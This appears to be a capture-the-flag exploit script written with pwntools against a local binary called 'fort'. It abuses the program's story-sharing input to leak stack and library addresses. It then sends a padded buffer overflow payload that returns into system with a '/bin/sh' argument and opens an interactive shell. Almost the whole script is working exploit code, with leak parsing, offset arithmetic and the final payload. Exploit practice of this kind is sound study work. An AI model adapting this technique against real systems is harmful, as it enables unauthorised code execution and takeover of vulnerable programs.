from pwn import *
context.log_level = "debug"
p = process("./fort")
# pause(2)
# connect with  gdb -q -p $(pidof ./chall)
def share_story(size, contents):
    p.sendline(b"2")
    p.sendlineafter(b"Size: ", size)
    p.sendlineafter(b"Text: ", contents)
def exit():
    p.sendline(b"3")

share_story(b"301", b"")
leak = p.recvuntil("> ")
stack_offset = leak[4:]
stack_offset = stack_offset[:-338]
stack_offset = u32(stack_offset.ljust(4, b'\x00'))
stack_offset = stack_offset + 0x24
leak = leak[64:]
leak = leak[:-278]
leak = u32(leak.ljust(4, b'\x00'))
offset = leak - 0x20FF4
padding = b'a'*60
system = 0x00001970+offset+0x10000 #idk why i need 0x10000 cuz the offset is correct to binsh but not this but whatever
main = 0x00001473+offset+0x10000
binsh = 0x0001e066+offset


payload = padding+p32(stack_offset+4)+(p32(system))+p32(main)+p32(binsh) #stack_offset + 4 cuz the binary subtracts it by 4
share_story(b"301", payload)
exit()
# print("system: ",hex(system))
# print("binsh: ",hex(binsh))
# print("stack: ",hex(stack_offset))

p.interactive()